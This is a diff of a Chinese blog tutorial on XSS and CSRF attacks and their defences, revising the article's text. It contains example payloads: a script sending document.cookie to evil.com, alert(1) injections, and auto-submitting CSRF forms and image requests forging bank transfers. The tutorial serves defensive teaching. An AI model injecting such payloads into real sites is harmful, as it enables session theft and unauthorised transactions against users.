@@ -29,7 +29,7 @@
 <meta property="og:description" content="参考：https:&#x2F;&#x2F;juejin.cn&#x2F;post&#x2F;6844903685122703367https:&#x2F;&#x2F;tech.meituan.com&#x2F;2018&#x2F;10&#x2F;11&#x2F;fe-security-csrf.htmlhttps:&#x2F;&#x2F;juejin.cn&#x2F;post&#x2F;6844903638532358151 XSS概念Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-08-07T12:00:00.000Z">
-<meta property="article:modified_time" content="2025-08-09T13:23:16.580Z">
+<meta property="article:modified_time" content="2025-08-12T06:59:37.014Z">
 <meta property="article:author" content="Keven">
 <meta property="article:tag" content="浏览器">
 <meta property="article:tag" content="安全">
@@ -267,7 +267,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          7k 字
+          8.4k 字
         
       </span>
     
@@ -278,7 +278,7 @@
         
         
         
-          44 分钟
+          53 分钟
         
       </span>
     
@@ -378,10 +378,10 @@
     
       
       
-        <a href="/2021/09/09/%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AD%98%E5%82%A8/" title="客户端存储"
+        <a href="/2021/09/09/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/" title="浏览器存储"
            class="list-group-item list-group-item-action
            ">
-          <span class="category-post">客户端存储</span>
+          <span class="category-post">浏览器存储</span>
         </a>
       
     
@@ -448,7 +448,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年8月9日 晚上
+                    本文最后更新于 2025年8月12日 下午
                   
                 
               </p>
@@ -459,95 +459,110 @@
                 <p>参考：<br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903685122703367">https://juejin.cn/post/6844903685122703367</a><br><a target="_blank" rel="noopener" href="https://tech.meituan.com/2018/10/11/fe-security-csrf.html">https://tech.meituan.com/2018/10/11/fe-security-csrf.html</a><br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903638532358151">https://juejin.cn/post/6844903638532358151</a></p>
 <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站当中注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可以获取用户的敏感信息如 Cookie、sessionID 等内容，进而危害数据安全。</p>
 <p>为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。XSS 的本质是恶意代码未经过滤，与网站正常的代码混在一起，浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。</p>
-<p>在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行来完成比较复杂的攻击策略。不仅是业务上用户生产的内容可以进行注入，包括 URL 上参数等等都可以是攻击的来源。因此在处理输入时，以下内容都不可信：</p>
+<p>在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行来完成比较复杂的攻击策略。不仅是业务上用户生产的内容可以进行注入，包括 URL 上参数等都可以是攻击的来源。因此在处理输入时，以下内容都不可信：</p>
 <ul>
 <li>来自用户生成的内容（UGC）</li>
 <li>来自第三方的链接</li>
 <li>URL 参数</li>
 <li>POST 参数</li>
-<li>Referer （可能来自不可信的来源）</li>
-<li>Cookie （可能来自其他子域注入）</li>
+<li>Referer（可能来自不可信的来源）</li>
+<li>Cookie（可能来自其他子域注入）</li>
 </ul>
-<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。<br>存储区：恶意代码存放的位置。插入点：由谁取得恶意代码并插入到网页上。</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。</p>
 <table>
 <thead>
 <tr>
 <th align="center">分类</th>
-<th align="center">存储区</th>
-<th align="center">插入点</th>
+<th align="center">存储区*</th>
+<th align="center">插入点*</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="center">存储型 XSS</td>
-<td align="center">后端数据库</td>
+<td align="center">存储型</td>
+<td align="center">服务器存储</td>
 <td align="center">HTML</td>
 </tr>
 <tr>
-<td align="center">反射型 XSS</td>
+<td align="center">反射型</td>
 <td align="center">URL</td>
 <td align="center">HTML</td>
 </tr>
 <tr>
-<td align="center">DOM 型 XSS</td>
-<td align="center">无</td>
+<td align="center">DOM 型</td>
+<td align="center">浏览器内存</td>
 <td align="center">前端 JavaScript</td>
 </tr>
 </tbody></table>
-<h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>存储型 XSS 的攻击步骤：</p>
 <ul>
-<li>攻击者将恶意代码提交到目标网站的数据库中。</li>
-<li>用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</li>
-<li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
-<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户调用目标网站接口执行指定操作。</li>
+<li>存储区：恶意代码存放的位置</li>
+<li>插入点：由谁取得恶意代码并插入到网页上</li>
 </ul>
-<p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p>
-<h3 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h3><p>反射型 XSS 的攻击步骤：</p>
-<ul>
-<li>攻击者构造出特殊的 URL，其中包含恶意代码。</li>
-<li>用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</li>
-<li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
-<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户调用目标网站接口执行指定操作。</li>
+<h3 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h3><ul>
+<li>原理：攻击者将恶意脚本存储到服务器数据库、文件或其他持久化介质，其他用户访问相关页面会自动执行恶意脚本</li>
+<li>触发条件：受害者访问了被注入脚本的页面</li>
+<li>特点：<ul>
+<li>危害大，影响持久</li>
+<li>可影响所有访问该数据的用户</li>
 </ul>
-<p>反射型 XSS 跟存储型 XSS 的区别是，存储型 XSS 的恶意代码存在数据库里，而反射型 XSS 的恶意代码存在 URL 里。反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。</p>
-<p>由于需要用户主动打开恶意的 URL 才能攻击，攻击者往往会结合多种手段诱导用户点击。POST 方法也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。</p>
-<h3 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h3><p>DOM 型 XSS 的攻击步骤：</p>
-<ul>
-<li>攻击者构造出特殊的 URL，其中包含恶意代码。</li>
-<li>用户打开带有恶意代码的 URL。</li>
-<li>用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</li>
-<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户调用目标网站接口执行指定操作。</li>
+</li>
+<li>场景：常见于带有用户保存数据的网站功能，如论坛发帖、评论、用户私信、个人简介等</li>
+<li>例子：比如提交 <code>&lt;script&gt;fetch(&#39;https://evil.com?cookie=&#39;+document.cookie)&lt;/script&gt;</code> 到评论区，其他用户浏览评论时中招</li>
 </ul>
-<p>DOM 型 XSS 跟前两种 XSS 的区别：在 DOM 型 XSS 攻击中取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p>
-<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>XSS 攻击有两大要素：</p>
+<h3 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h3><ul>
+<li>原理：攻击者把恶意脚本通过 URL 参数等立即“反射”到页面响应中执行</li>
+<li>触发条件：受害者点击带恶意参数的链接，服务端未进行输出转义，直接拼到 HTML 返回。由于需要用户主动打开恶意的 URL 才能攻击，攻击者往往会结合多种手段诱导用户点击。POST 方法也可以触发反射型 XSS，但是触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见</li>
+<li>特点：<ul>
+<li>不会长期存储在服务器</li>
+<li>依赖用户点击或请求</li>
+</ul>
+</li>
+<li>场景：常见于通过 URL 传递参数的功能，如网站搜索、跳转等</li>
+<li>例子：比如构造 <code>https://example.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code> 样式的 URL，如果服务器直接将 q 输出到 HTML 中，就会执行弹窗</li>
+</ul>
+<p>反射型 XSS 跟存储型 XSS 的区别在于，存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</p>
+<h3 id="DOM-based-XSS"><a href="#DOM-based-XSS" class="headerlink" title="DOM-based XSS"></a>DOM-based XSS</h3><ul>
+<li>原理：前端 JavaScript 代码有漏洞，浏览器在处理 DOM 时直接把用户输入拼接到可执行位置，导致执行恶意脚本</li>
+<li>触发条件：无需经过服务器拼接 HTML，纯前端脚本操作引发</li>
+<li>特点：<ul>
+<li>漏洞点在前端 JavaScript 代码</li>
+<li>数据流：用户输入 → 前端 JS → DOM API → 执行</li>
+</ul>
+</li>
+<li>场景：常见于需要用户输入的页面</li>
+<li>例子：在 <code>https://example.com/#&lt;script&gt;alert(1)&lt;/script&gt;</code> 网站执行<code>document.body.innerHTML = location.hash.substring(1);</code></li>
+</ul>
+<p>DOM 型 XSS 跟另外两种 XSS 的区别在于，DOM 型 XSS 攻击中取出和执行恶意代码由浏览器完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p>
+<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>XSS 攻击有两大要素必不可少：</p>
 <ul>
 <li>攻击者提交恶意代码</li>
 <li>浏览器执行恶意代码</li>
 </ul>
-<h3 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h3><p>在用户提交时，由前端过滤输入，然后提交到后端。这样做不可行。因为一旦攻击者绕过前端过滤，而直接构造请求就可以提交恶意代码。</p>
-<p>后端在写入数据库前对输入进行过滤，然后把“安全的”内容返回给前端。这样做不完全可行。比如，正常输入了 <code>5 &lt; 7</code> 这个内容，在写入数据库前被转义变成了 <code>5 &amp;lt; 7</code>。但问题是，在提交阶段，我们并不确定内容要输出到哪里：</p>
+<h3 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h3><p>在用户提交时，由前端过滤输入，然后提交到后端。这样做不可行，因为一旦攻击者绕过前端过滤，改为直接构造请求就可以提交恶意代码。</p>
+<p>后端在写入数据库前对输入进行过滤，然后把“安全的”内容返回给前端，这样做不完全可行。比如，正常输入了 <code>5 &lt; 7</code> 这个内容，在写入数据库前被转义变成了 <code>5 &amp;lt; 7</code>。但问题是，并不确定内容要输出到哪里：</p>
 <ul>
-<li>用户的输入内容可能同时提供给前端和客户端，而一旦经过了 escapeHTML 转义后没有进行 unescapeHTML 反转，客户端显示的内容就变成了乱码 <code>5 &amp;lt; 7</code></li>
-<li>在前端中，不同的位置所需的编码也不同：<ul>
+<li>用户的输入内容可能同时提供给前端和客户端，如果没有进行反转客户端显示内容就变成了乱码</li>
+<li>在前端中，不同的位置所需要的编码也不同<ul>
 <li>当 <code>5 &amp;lt; 7</code> 作为 HTML 拼接页面时可以正常显示</li>
-<li>当 <code>5 &amp;lt; 7</code> 通过 Ajax 值返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。</li>
+<li>当 <code>5 &amp;lt; 7</code> 通过 Ajax 值返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算</li>
 </ul>
 </li>
 </ul>
-<p>所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但是会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等内容，进行输入过滤还是必要的。既然输入过滤并非完全可靠，就要通过“防止浏览器执行恶意代码”来防范 XSS。这部分分为两类：</p>
+<p>所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但是会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等内容，进行输入过滤还是必要的。</p>
+<p>既然输入过滤并非完全可靠，就要通过“防止浏览器执行恶意代码”来防范 XSS 攻击，可分为两类：</p>
 <ul>
 <li>防止 HTML 中出现注入</li>
 <li>防止 JavaScript 执行时执行恶意代码</li>
 </ul>
-<h3 id="存储型和反射型"><a href="#存储型和反射型" class="headerlink" title="存储型和反射型"></a>存储型和反射型</h3><p>存储型和反射型 XSS 都是在服务端取出恶意代码后插入到响应 HTML 里，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。预防这两种漏洞，有两种常见做法：</p>
+<h3 id="预防存储型和反射型"><a href="#预防存储型和反射型" class="headerlink" title="预防存储型和反射型"></a>预防存储型和反射型</h3><p>存储型和反射型 XSS 攻击都是在服务端取出恶意代码后插入到响应 HTML，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。预防这种漏洞，有两种常见做法：</p>
 <ul>
 <li>改成纯前端渲染，把代码和数据分隔开</li>
 <li>对 HTML 做充分转义</li>
 </ul>
 <h4 id="纯前端渲染"><a href="#纯前端渲染" class="headerlink" title="纯前端渲染"></a>纯前端渲染</h4><p>纯前端渲染的过程：</p>
 <ul>
-<li>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</li>
-<li>然后浏览器执行 HTML 中的 JavaScript。</li>
-<li>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。</li>
+<li>浏览器先加载一个静态 HTML 文件，此 HTML 不包含任何跟业务相关的数据</li>
+<li>然后浏览器执行 HTML 中的 JavaScript</li>
+<li>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上</li>
 </ul>
 <p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码。但是纯前端渲染还需注意避免 DOM 型 XSS 漏洞。</p>
 <p>在很多内部管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高或者有 SEO 需求的页面，仍然要面对拼接 HTML 的问题。</p>
@@ -586,10 +601,10 @@
 </tr>
 </tbody></table>
 <p>要完善 XSS 防护措施，要使用更完善更细致的转义策略。而且 HTML 编码是十分复杂的，在不同的上下文要使用相应的转义规则。</p>
-<h3 id="DOM-型"><a href="#DOM-型" class="headerlink" title="DOM 型"></a>DOM 型</h3><p>DOM 型 XSS 攻击，实际上就是前端 JavaScript 代码本身不严谨，把不可信的数据当作代码执行了。</p>
+<h3 id="预防-DOM-型"><a href="#预防-DOM-型" class="headerlink" title="预防 DOM 型"></a>预防 DOM 型</h3><p>DOM 型 XSS 攻击，实际上就是前端 JavaScript 代码本身不严谨，把不可信的数据当作代码执行了。</p>
 <p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等属性。如果用 Vue/React 技术栈，尽量不用 <code>v-html</code>/<code>dangerouslySetInnerHTML</code> 等，在前端 render 阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的 XSS 隐患。</p>
 <p>DOM 中的内联事件监听器，比如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> ，<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript 里的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code> 等函数，都能把字符串作为代码运行。如果把不可信的数据拼接到字符串中并传递给这些 API，就很容易产生安全隐患。</p>
-<h3 id="其他防范措施"><a href="#其他防范措施" class="headerlink" title="其他防范措施"></a>其他防范措施</h3><h4 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4><p>严格的 CSP（Content Security Policy） 在 XSS 的防范中可以起到以下的作用：</p>
+<h3 id="其他防范措施"><a href="#其他防范措施" class="headerlink" title="其他防范措施"></a>其他防范措施</h3><h4 id="严格-CSP"><a href="#严格-CSP" class="headerlink" title="严格 CSP"></a>严格 CSP</h4><p>严格的 CSP（Content Security Policy） 在 XSS 的防范中可以起到以下的作用：</p>
 <ul>
 <li>禁止加载外域代码，防止复杂的攻击逻辑。</li>
 <li>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</li>
@@ -598,7 +613,7 @@
 <li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li>
 </ul>
 <h4 id="控制输入内容长度"><a href="#控制输入内容长度" class="headerlink" title="控制输入内容长度"></a>控制输入内容长度</h4><p>对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。</p>
-<h4 id="Cookie-HttpOnly"><a href="#Cookie-HttpOnly" class="headerlink" title="Cookie HttpOnly"></a>Cookie HttpOnly</h4><p>禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取 Cookie。</p>
+<h4 id="Cookie-HttpOnly"><a href="#Cookie-HttpOnly" class="headerlink" title="Cookie HttpOnly"></a>Cookie HttpOnly</h4><p>设置 Cookie 时使用 <code>HttpOnly</code> 属性，禁止 JavaScript 读取敏感 Cookie，攻击者完成 XSS 注入后也无法窃取 Cookie。</p>
 <h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>有两种方法检测 XSS 漏洞：</p>
 <ul>
 <li><p>使用通用 XSS 攻击字符串手动检测 XSS 漏洞</p>
@@ -609,58 +624,74 @@
 <li><p>使用扫描工具自动检测 XSS 漏洞<br>如 Arachni、Mozilla HTTP Observatory、w3af 等工具。</p>
 </li>
 </ul>
-<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，来绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p>
+<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>CSRF（Cross-site request forgery）跨站请求伪造：攻击者利用浏览器在请求时自动带上用户凭证（如 Cookie、Session、HTTP 认证信息）的特性发起冒充用户执行未授权请求的攻击方式。</p>
 <p>一个典型的 CSRF 攻击有着如下的流程：</p>
 <ul>
 <li>受害者登录 a.com，并保留了登录凭证（Cookie）</li>
 <li>攻击者引诱受害者访问了 b.com</li>
-<li>b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带 a.com 的 Cookie</li>
-<li>a.com 接收到请求后，对请求进行验证并确认是受害者的凭证，误以为是受害者自己发送的请求</li>
-<li>a.com 以受害者的名义执行了 act=xx</li>
-<li>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让 a.com 执行了自己定义的操作</li>
+<li>b.com 向 a.com 发送了一个请求：a.com/act=xx，浏览器会默认携带 a.com 的 Cookie</li>
+<li>a.com 接收到请求后对请求进行验证，确认是受害者的凭证，误以为是受害者发送的请求并执行</li>
+<li>攻击者在受害者不知情的情况下，冒充受害者，让 a.com 执行了攻击者定义的操作，攻击完成</li>
 </ul>
-<h2 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h2><h3 id="GET-类型"><a href="#GET-类型" class="headerlink" title="GET 类型"></a>GET 类型</h3><p>GET 类型的 CSRF 利用非常简单，只需要一个 HTTP 请求，一般会这样利用：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">![](https:<span class="hljs-regexp">//</span>awps-assets.meituan.net<span class="hljs-regexp">/mit-x/</span>blog-images-bundle-<span class="hljs-number">2018</span>b<span class="hljs-regexp">/ff0cdbee.example/</span>withdraw?amount=<span class="hljs-number">10000</span>&amp;<span class="hljs-keyword">for</span>=hacker)<br></code></pre></td></tr></table></figure>
-
-<p>在受害者访问含有这个 img 的页面后，浏览器会自动向 <a target="_blank" rel="noopener" href="http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker">http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker</a> 发出一次 HTTP 请求。bank.example 就会收到包含受害者登录信息的一次跨域请求。</p>
-<h3 id="POST-类型"><a href="#POST-类型" class="headerlink" title="POST 类型"></a>POST 类型</h3><p>这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单，如：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://bank.example/withdraw&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;account&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;xiaoming&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;amount&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;10000&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;for&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hacker&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">  <span class="hljs-built_in">document</span>.forms[<span class="hljs-number">0</span>].submit();</span><br><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。</p>
+<h2 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h2><h3 id="GET-型"><a href="#GET-型" class="headerlink" title="GET 型"></a>GET 型</h3><ul>
+<li>原理：利用浏览器自动加载资源的特性（如图片、CSS 等）</li>
+<li>特点：<ul>
+<li>无需用户交互</li>
+<li>可嵌入在 <code>&lt;img&gt;</code>、<code>&lt;a&gt;</code>、<code>&lt;script&gt;</code> 等标签里</li>
+</ul>
+</li>
+<li>例子：<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-params">&lt;img src=&quot;https://bank.com/transfer?account=xiaoming<span class="hljs-variable">&amp;amount</span>=<span class="hljs-number">10</span><span class="hljs-variable">&amp;to</span>=hacker&quot;&gt;</span><br></code></pre></td></tr></table></figure>
+在受害者访问含有这个 img 的页面后，浏览器会自动向 <code>https://bank.com/transfer</code> 发出一次 HTTP 请求，要求银行执行小明向黑客的账号转钱的操作。如果小明登录了 bank.com 而且该请求能直接转账就会中招。</li>
+</ul>
+<h3 id="POST-型"><a href="#POST-型" class="headerlink" title="POST 型"></a>POST 型</h3><ul>
+<li>原理：伪造不可见的表单，通过 JS 自动提交</li>
+<li>特点：<ul>
+<li>无需用户交互</li>
+<li>构造隐藏 <code>&lt;form&gt;</code> 表单</li>
+</ul>
+</li>
+<li>例子：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://bank.example/withdraw&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;account&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;xiaoming&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;amount&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;10&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;to&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hacker&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">  <span class="hljs-built_in">document</span>.forms[<span class="hljs-number">0</span>].submit();</span><br><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。</li>
+</ul>
 <p>POST 类型的攻击通常比 GET 要求更加严格一点，但仍并不复杂。任何个人网站、博客、被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许 POST 上面。</p>
-<h3 id="链接类型"><a href="#链接类型" class="headerlink" title="链接类型"></a>链接类型</h3><p>链接类型的 CSRF 并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span></span><br><span class="hljs-tag">  <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">taget</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span><br>  重磅消息！！<br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span></span><br><span class="hljs-tag">/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>由于之前用户登录了信任的网站 A，并且保存了登录状态，只要用户主动访问上面的这个 PHP 页面，则表示攻击成功。</p>
+<h3 id="点击诱导型"><a href="#点击诱导型" class="headerlink" title="点击诱导型"></a>点击诱导型</h3><ul>
+<li>原理：伪造正常交互元素（链接、按钮等），诱骗用户主动触发</li>
+<li>特点：<ul>
+<li>需要用户交互</li>
+<li>伪造正常交互元素</li>
+</ul>
+</li>
+<li>例子：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://weibo.com/follow&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;target_id&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;attacker_id&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>点击抽奖<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>
